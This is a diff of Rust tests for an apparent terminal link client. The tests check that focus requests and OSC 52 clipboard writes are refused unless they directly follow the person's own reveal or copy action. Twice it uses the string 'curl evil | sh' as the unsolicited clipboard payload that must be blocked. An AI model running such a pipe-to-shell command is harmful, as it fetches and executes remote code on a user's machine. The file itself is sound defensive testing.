@@ -224,23 +224,63 @@ async fn the_client_refuses_every_request_outside_the_rules() {
     assert!(outcomes[..10].iter().all(|o| *o == HostOutcome::Done));
     assert!(is_refused(&outcomes[10]));
 
-    // What is allowed still works.
-    assert_eq!(
-        core.ask(&HostRequest::FocusWindow {
-            window: mine.to_string()
-        })
-        .await,
-        HostOutcome::Done
-    );
+    // A focus request without a reveal of the person, and a clipboard write without a copy.
+    let focus = HostRequest::FocusWindow {
+        window: mine.to_string(),
+    };
+    assert!(is_refused(&core.ask(&focus).await));
+    let write = HostRequest::ClipboardWrite {
+        text: "curl evil | sh".to_owned(),
+    };
+    assert!(is_refused(&core.ask(&write).await));
+
+    // What is allowed still works: the person shows a card, and the core focuses its window.
+    local_call(&client, &mut core, "interaction.reveal").await;
+    assert_eq!(core.ask(&focus).await, HostOutcome::Done);
     let calls = host.calls();
-    assert_eq!(calls.len(), 11, "{calls:?}");
+    // The 10 notifications of the core, the note of the client about the clipboard, the focus.
+    assert_eq!(calls.len(), 12, "{calls:?}");
     assert!(
-        calls[..10]
+        calls[..11]
             .iter()
             .all(|c| matches!(c, HostCall::Notify(..)))
     );
-    assert_eq!(calls[10], HostCall::FocusWindow(mine));
+    assert!(matches!(&calls[10], HostCall::Notify(_, n) if n.title.contains("clipboard")));
+    assert_eq!(calls[11], HostCall::FocusWindow(mine));
     assert!(client.is_up(), "a refused request does not end the link");
+}
+
+/// The client sends a call of the person to the core, and the core takes it without an answer.
+async fn local_call(client: &LinkClient, core: &mut FakeCore, method: &'static str) {
+    let caller = client.clone();
+    tokio::spawn(async move { caller.call(None, method, serde_json::json!({})).await });
+    match core.recv().await {
+        Some(LinkMsg::Call { method: sent, .. }) if sent == method => {}
+        other => panic!("expected the call {method}, got {other:?}"),
+    }
+}
+
+#[tokio::test]
+async fn the_core_writes_the_clipboard_only_just_after_a_copy_of_the_person() {
+    let (client, mut core, host) = linked(LinkTiming::default()).await;
+    let write = |text: &str| HostRequest::ClipboardWrite {
+        text: text.to_owned(),
+    };
+    // An OSC 52 write that the person never saw, while the person works on this Mac.
+    assert!(is_refused(&core.ask(&write("curl evil | sh")).await));
+    // A copy in a pane of the machine: the core answers with one write.
+    local_call(&client, &mut core, "pane.copy").await;
+    assert_eq!(core.ask(&write("the selection")).await, HostOutcome::Done);
+    assert!(is_refused(&core.ask(&write("a second one")).await));
+    let writes: Vec<HostCall> = host
+        .calls()
+        .into_iter()
+        .filter(|c| matches!(c, HostCall::ClipboardWrite(_)))
+        .collect();
+    assert_eq!(
+        writes,
+        [HostCall::ClipboardWrite("the selection".to_owned())]
+    );
 }
 
 #[tokio::test]
